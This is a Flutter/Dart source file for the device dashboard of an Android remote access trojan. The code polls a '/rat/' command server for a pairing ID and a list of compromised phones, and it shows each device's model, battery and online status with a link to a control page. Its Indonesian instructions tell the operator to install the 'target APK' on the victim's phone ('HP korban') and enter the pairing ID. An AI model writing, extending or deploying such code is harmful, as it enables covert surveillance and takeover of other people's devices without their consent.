import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'package:provider/provider.dart';
import 'theme_provider.dart';
import 'control_panel.dart';

// Полная переработка UI: все надписи на индонезийском, современные карточки,
// градиенты, анимации, улучшенная читаемость и визуальная эстетика.
class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
    super.key,
    this.username = '',
    this.role = '',
    this.sessionKey = '',
  });
  @override
  State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> with SingleTickerProviderStateMixin {
  List<dynamic> _visible = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  Timer? _timer;
  late AnimationController _animCtrl;
  late Animation<double> _fadeIn;

  @override
  void initState() {
    super.initState();
    _animCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 500));
    _fadeIn = CurvedAnimation(parent: _animCtrl, curve: Curves.easeIn);
    _animCtrl.forward();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }

  @override
  void dispose() {
    _timer?.cancel();
    _animCtrl.dispose();
    super.dispose();
  }

  // ── Загрузка pairId и списка устройств ──────────────────────────────────
  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      final pRes = await http
          .get(Uri.parse('http://server.lynzzofficial.com:2014/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      final dRes = await http
          .get(Uri.parse('http://server.lynzzofficial.com:2014/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() { _loading = false; _errorMsg = 'Kesalahan server ${dRes.statusCode}'; });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() { _loading = false; _errorMsg = body['message'] ?? 'Error'; });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) { d['online'] = false; }
      }

      if (mounted) setState(() {
        _visible = devices;
        _loading = false;
        _errorMsg = null;
        _animCtrl.reset();
        _animCtrl.forward();
      });
    } catch (e) {
      if (mounted) setState(() { _loading = false; _errorMsg = e.toString(); });
    }
  }

  int get _active => _visible.where((d) => d['online'] == true).length;

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: theme.primaryColor,
      content: const Text('ID Pairing berhasil disalin!'),
      duration: const Duration(seconds: 2),
    ));
  }

  @override
  Widget build(BuildContext context) {
    final theme = Provider.of<ThemeProvider>(context);
    return Scaffold(
      backgroundColor: theme.backgroundColor,
      body: SafeArea(
        child: FadeTransition(
          opacity: _fadeIn,
          child: Column(
            children: [
              // ─── Header with gradient ─────────────────────────────────
              Container(
                padding: const EdgeInsets.fromLTRB(20, 16, 20, 16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [theme.primaryColor.withOpacity(0.15), theme.accentColor.withOpacity(0.05)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: const BorderRadius.only(
                    bottomLeft: Radius.circular(28),
                    bottomRight: Radius.circular(28),
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: theme.primaryColor.withOpacity(0.15),
                      blurRadius: 20,
                      offset: const Offset(0, 6),
                    ),
                  ],
                ),
                child: Column(
                  children: [
                    Row(
                      children: [
                        _statBox('ONLINE', '$_active', Colors.cyanAccent, theme),
                        const Spacer(),
                        Column(
                          children: [
                            Text(
                              'DASHBOARD PERANGKAT',
                              style: TextStyle(
                                color: theme.primaryColor,
                                fontSize: 12,
                                letterSpacing: 2.5,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                            const SizedBox(height: 4),
                            Text(
                              '@${widget.username}',
                              style: TextStyle(
                                color: theme.textSecondaryColor,
                                fontSize: 10,
                                fontWeight: FontWeight.w400,
                              ),
                            ),
                          ],
                        ),
                        const Spacer(),
                        _statBox('TOTAL', '${_visible.length}', theme.primaryColor, theme),
                      ],
                    ),
                    // ── PairID box ──────────────────────────────────────
                    if (_pairId.isNotEmpty) ...[
                      const SizedBox(height: 16),
                      GestureDetector(
                        onTap: _copyPairId,
                        child: Container(
                          width: double.infinity,
                          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                          decoration: BoxDecoration(
                            gradient: LinearGradient(
                              colors: [theme.primaryColor.withOpacity(0.08), theme.accentColor.withOpacity(0.04)],
                              begin: Alignment.centerLeft,
                              end: Alignment.centerRight,
                            ),
                            borderRadius: BorderRadius.circular(16),
                            border: Border.all(
                              color: theme.primaryColor.withOpacity(0.3),
                              width: 1.5,
                            ),
                          ),
                          child: Row(
                            children: [
                              Icon(Icons.link_rounded, color: theme.primaryColor, size: 22),
                              const SizedBox(width: 14),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      'ID PAIRING (bagikan ke target)',
                                      style: TextStyle(
                                        color: theme.textSecondaryColor,
                                        fontSize: 10,
                                        letterSpacing: 1.2,
                                      ),
                                    ),
                                    const SizedBox(height: 6),
                                    Text(
                                      _pairId,
                                      style: TextStyle(
                                        color: theme.primaryColor,
                                        fontSize: 18,
                                        fontWeight: FontWeight.bold,
                                        letterSpacing: 4,
                                        fontFamily: 'monospace',
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                              const SizedBox(width: 8),
                              Column(
                                children: [
                                  Icon(Icons.copy_rounded, color: theme.primaryColor, size: 20),
                                  const SizedBox(height: 4),
                                  Text(
                                    'SALIN',
                                    style: TextStyle(
                                      color: theme.primaryColor.withOpacity(0.8),
                                      fontSize: 8,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                                ],
                              ),
                            ],
                          ),
                        ),
                      ),
                      const SizedBox(height: 8),
                      Text(
                        'Tap untuk menyalin ID • ID ini unik milik akun @${widget.username}',
                        style: TextStyle(
                          color: theme.textSecondaryColor,
                          fontSize: 10,
                        ),
                        textAlign: TextAlign.center,
                      ),
                    ],
                  ],
                ),
              ),

              // ─── Error Banner ──────────────────────────────────────
              if (_errorMsg != null)
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                  child: _banner(Icons.error_rounded, _errorMsg!, theme.primaryColor, theme),
                ),

              // ─── Toolbar ──────────────────────────────────────────────
              Padding(
                padding: const EdgeInsets.fromLTRB(20, 12, 20, 8),
                child: Row(
                  children: [
                    Text(
                      'PERANGKAT TERHUBUNG',
                      style: TextStyle(
                        color: theme.textSecondaryColor,
                        fontSize: 11,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1.8,
                      ),
                    ),
                    const Spacer(),
                    GestureDetector(
                      onTap: () {
                        setState(() { _loading = true; _errorMsg = null; });
                        _loadAll();
                      },
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: theme.primaryColor.withOpacity(0.1),
                          shape: BoxShape.circle,
                        ),
                        child: Icon(Icons.refresh_rounded, color: theme.primaryColor, size: 20),
                      ),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: Colors.redAccent.withOpacity(0.1),
                          shape: BoxShape.circle,
                        ),
                        child: const Icon(Icons.close_rounded, color: Colors.redAccent, size: 20),
                      ),
                    ),
                  ],
                ),
              ),

              // ─── Device Grid ──────────────────────────────────────────
              Expanded(
                child: _loading
                    ? Center(
                        child: CircularProgressIndicator(
                          color: theme.primaryColor,
                          strokeWidth: 2.5,
                        ),
                      )
                    : _visible.isEmpty
                        ? _buildEmptyState(theme)
                        : GridView.builder(
                            padding: const EdgeInsets.fromLTRB(16, 8, 16, 80),
                            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                              crossAxisCount: 3,
                              crossAxisSpacing: 12,
                              mainAxisSpacing: 12,
                              childAspectRatio: 0.7,
                            ),
                            itemCount: _visible.length,
                            itemBuilder: (ctx, i) {
                              final d = _visible[i];
                              final on = d['online'] == true;
                              final statusColor = on ? Colors.cyanAccent : Colors.redAccent;

                              return GestureDetector(
                                onTap: () => Navigator.push(
                                  ctx,
                                  MaterialPageRoute(
                                    builder: (_) => ControlCenterPage(
                                      targetDevice: d,
                                      role: widget.role,
                                    ),
                                  ),
                                ),
                                child: AnimatedContainer(
                                  duration: const Duration(milliseconds: 300),
                                  curve: Curves.easeInOut,
                                  padding: const EdgeInsets.all(12),
                                  decoration: BoxDecoration(
                                    gradient: LinearGradient(
                                      colors: [
                                        theme.glassPrimary,
                                        theme.glassSecondary,
                                      ],
                                      begin: Alignment.topLeft,
                                      end: Alignment.bottomRight,
                                    ),
                                    borderRadius: BorderRadius.circular(20),
                                    border: Border.all(
                                      color: on
                                          ? theme.primaryColor.withOpacity(0.4)
                                          : theme.textPrimaryColor.withOpacity(0.1),
                                      width: 1.5,
                                    ),
                                    boxShadow: on
                                        ? [
                                            BoxShadow(
                                              color: theme.primaryColor.withOpacity(0.15),
                                              blurRadius: 12,
                                              spreadRadius: 2,
                                            ),
                                          ]
                                        : null,
                                  ),
                                  child: Column(
                                    crossAxisAlignment: CrossAxisAlignment.start,
                                    children: [
                                      Row(
                                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                        children: [
                                          Icon(
                                            Icons.phone_android_rounded,
                                            color: theme.textSecondaryColor,
                                            size: 16,
                                          ),
                                          Container(
                                            padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                                            decoration: BoxDecoration(
                                              color: statusColor.withOpacity(0.1),
                                              border: Border.all(color: statusColor.withOpacity(0.5)),
                                              borderRadius: BorderRadius.circular(8),
                                            ),
                                            child: Row(
                                              children: [
                                                Container(
                                                  width: 6,
                                                  height: 6,
                                                  decoration: BoxDecoration(
                                                    color: statusColor,
                                                    shape: BoxShape.circle,
                                                  ),
                                                ),
                                                const SizedBox(width: 4),
                                                Text(
                                                  on ? 'ON' : 'OFF',
                                                  style: TextStyle(
                                                    color: statusColor,
                                                    fontSize: 8,
                                                    fontWeight: FontWeight.bold,
                                                  ),
                                                ),
                                              ],
                                            ),
                                          ),
                                        ],
                                      ),
                                      const Spacer(),
                                      Text(
                                        d['model'] ?? 'Tidak dikenal',
                                        style: TextStyle(
                                          color: theme.textPrimaryColor,
                                          fontSize: 11,
                                          fontWeight: FontWeight.bold,
                                        ),
                                        maxLines: 1,
                                        overflow: TextOverflow.ellipsis,
                                      ),
                                      const SizedBox(height: 4),
                                      Text(
                                        d['id'] ?? '-',
                                        style: TextStyle(
                                          color: theme.textSecondaryColor,
                                          fontSize: 8,
                                        ),
                                        maxLines: 1,
                                        overflow: TextOverflow.ellipsis,
                                      ),
                                      const Spacer(),
                                      Row(
                                        children: [
                                          Icon(
                                            Icons.battery_charging_full_rounded,
                                            color: theme.textSecondaryColor,
                                            size: 12,
                                          ),
                                          const SizedBox(width: 4),
                                          Text(
                                            '${d['battery'] ?? '?'}%',
                                            style: TextStyle(
                                              color: theme.textPrimaryColor,
                                              fontSize: 10,
                                            ),
                                          ),
                                        ],
                                      ),
                                    ],
                                  ),
                                ),
                              );
                            },
                          ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildEmptyState(ThemeProvider theme) {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(
            Icons.devices_other_rounded,
            color: theme.textSecondaryColor.withOpacity(0.3),
            size: 64,
          ),
          const SizedBox(height: 16),
          Text(
            'BELUM ADA PERANGKAT',
            style: TextStyle(
              color: Colors.white,
              fontWeight: FontWeight.bold,
              letterSpacing: 2.5,
              fontSize: 14,
            ),
          ),
          const SizedBox(height: 8),
          Text(
            'Belum ada perangkat yang terhubung',
            style: TextStyle(
              color: theme.textSecondaryColor,
              fontSize: 12,
            ),
          ),
          const SizedBox(height: 24),
          Container(
            margin: const EdgeInsets.symmetric(horizontal: 32),
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [theme.primaryColor.withOpacity(0.08), theme.accentColor.withOpacity(0.04)],
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: theme.primaryColor.withOpacity(0.2)),
            ),
            child: Column(
              children: [
                Icon(Icons.info_outline_rounded, color: theme.primaryColor, size: 28),
                const SizedBox(height: 12),
                Text(
                  'Cara hubungkan perangkat:',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 12,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 10),
                Text(
                  '1. Install APK target di HP korban\n2. Buka APK → masukkan ID Pairing di atas\n3. Perangkat otomatis muncul di sini',
                  style: TextStyle(
                    color: Colors.white54,
                    fontSize: 11,
                  ),
                  textAlign: TextAlign.center,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _banner(IconData icon, String msg, Color c, ThemeProvider theme) {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [c.withOpacity(0.08), c.withOpacity(0.02)],
        ),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: c.withOpacity(0.25)),
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Icon(icon, color: c, size: 18),
          const SizedBox(width: 12),
          Expanded(
            child: Text(
              msg,
              style: TextStyle(color: c, fontSize: 12, height: 1.5),
            ),
          ),
        ],
      ),
    );
  }

  Widget _statBox(String label, String value, Color color, ThemeProvider theme) {
    return Column(
      children: [
        Text(
          label,
          style: TextStyle(
            color: theme.textSecondaryColor,
            fontSize: 9,
            letterSpacing: 1.2,
          ),
        ),
        const SizedBox(height: 4),
        Text(
          value,
          style: TextStyle(
            color: color,
            fontSize: 22,
            fontWeight: FontWeight.bold,
            shadows: [
              Shadow(
                blurRadius: 10,
                color: color.withOpacity(0.4),
                offset: const Offset(0, 0),
              ),
            ],
          ),
        ),
      ],
    );
  }
}